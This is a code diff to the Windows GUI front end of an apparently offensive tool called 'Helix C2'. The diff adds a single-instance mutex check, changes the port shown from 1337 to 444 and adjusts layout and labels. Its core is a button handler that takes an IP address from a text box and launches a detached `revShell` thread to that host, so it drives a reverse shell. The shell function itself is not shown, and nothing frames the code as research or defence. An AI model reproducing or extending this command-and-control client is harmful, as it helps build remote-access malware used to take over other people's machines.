@@ -1,8 +1,7 @@
 #pragma once
 
-#include "status.h"
 #include "functions.h"
-
+#include "headers.h"
 
 using namespace std;
 
@@ -22,10 +21,21 @@ namespace Helix {
         // AND THIS
         // AND THIS
         // AND THIS
+
     public:
 
         mainForm(void) {
-            InitializeComponent();
+            bool createdNew = false;
+            HANDLE hMutex = CreateMutex(NULL, TRUE, L"Global\\HelixMutex");
+
+            if (GetLastError() == ERROR_ALREADY_EXISTS) {
+                MessageBox::Show("An instance of this application is already running.",
+                    "Error", MessageBoxButtons::OK, MessageBoxIcon::Error);
+                Environment::Exit(0);
+            }
+            else {
+                InitializeComponent();
+            }
         }
 
     protected:
@@ -56,6 +66,7 @@ namespace Helix {
         void updateTextBox(System::String^ text) {
             this->textBox3->Text += text + "\r\n";
         }
+
 
 #pragma region Windows Form Designer generated code
         /// <summary>
@@ -107,12 +118,12 @@ namespace Helix {
             this->textBox1->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 9, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
                 static_cast<System::Byte>(0)));
             this->textBox1->ForeColor = System::Drawing::SystemColors::ActiveCaptionText;
-            this->textBox1->Location = System::Drawing::Point(27, 11);
+            this->textBox1->Location = System::Drawing::Point(17, 11);
             this->textBox1->Name = L"textBox1";
             this->textBox1->ReadOnly = true;
             this->textBox1->Size = System::Drawing::Size(192, 21);
             this->textBox1->TabIndex = 5;
-            this->textBox1->Text = L"Helix C2 graphical interface client";
+            this->textBox1->Text = L"Helix C2 Windows GUI client";
             // 
             // groupBox1
             // 
@@ -122,7 +133,7 @@ namespace Helix {
             this->groupBox1->Controls->Add(this->textBox2);
             this->groupBox1->Controls->Add(this->ipAddrBox);
             this->groupBox1->Controls->Add(this->button1);
-            this->groupBox1->Location = System::Drawing::Point(12, 38);
+            this->groupBox1->Location = System::Drawing::Point(17, 38);
             this->groupBox1->Name = L"groupBox1";
             this->groupBox1->Size = System::Drawing::Size(252, 102);
             this->groupBox1->TabIndex = 6;
@@ -173,17 +184,17 @@ namespace Helix {
             this->textBox2->ReadOnly = true;
             this->textBox2->Size = System::Drawing::Size(54, 23);
             this->textBox2->TabIndex = 4;
-            this->textBox2->Text = L"1337";
+            this->textBox2->Text = L"444";
             // 
             // groupBox2
             // 
             this->groupBox2->Controls->Add(this->textBox3);
-            this->groupBox2->Location = System::Drawing::Point(12, 166);
+            this->groupBox2->Location = System::Drawing::Point(17, 146);
             this->groupBox2->Name = L"groupBox2";
             this->groupBox2->Size = System::Drawing::Size(252, 167);
             this->groupBox2->TabIndex = 7;
             this->groupBox2->TabStop = false;
-            this->groupBox2->Text = L"Server status";
+            this->groupBox2->Text = L"Connection status";
             // 
             // textBox3
             // 
@@ -202,7 +213,7 @@ namespace Helix {
             this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
             this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
             this->BackColor = System::Drawing::Color::WhiteSmoke;
-            this->ClientSize = System::Drawing::Size(281, 346);
+            this->ClientSize = System::Drawing::Size(281, 321);
             this->ControlBox = false;
             this->Controls->Add(this->groupBox2);
             this->Controls->Add(this->groupBox1);
@@ -250,7 +261,6 @@ namespace Helix {
         System::Void button1_Click(System::Object^ sender, System::EventArgs^ e) {
 
             System::String^ ipAddrManaged = this->ipAddrBox->Text;
-            int port = 1337;
 
             IntPtr ptrToStringChars = System::Runtime::InteropServices::Marshal::StringToHGlobalAnsi(ipAddrManaged);
             char* ipAddr = static_cast<char*>(ptrToStringChars.ToPointer());
@@ -260,9 +270,9 @@ namespace Helix {
             }
             else {
 
-                updateTextBox("Attempting connection");
+                updateTextBox("Attempting connection...");
 
-                thread revShellThread(revShell, ipAddr, port);
+                thread revShellThread(revShell, ipAddr);
                 revShellThread.detach();
 
             }
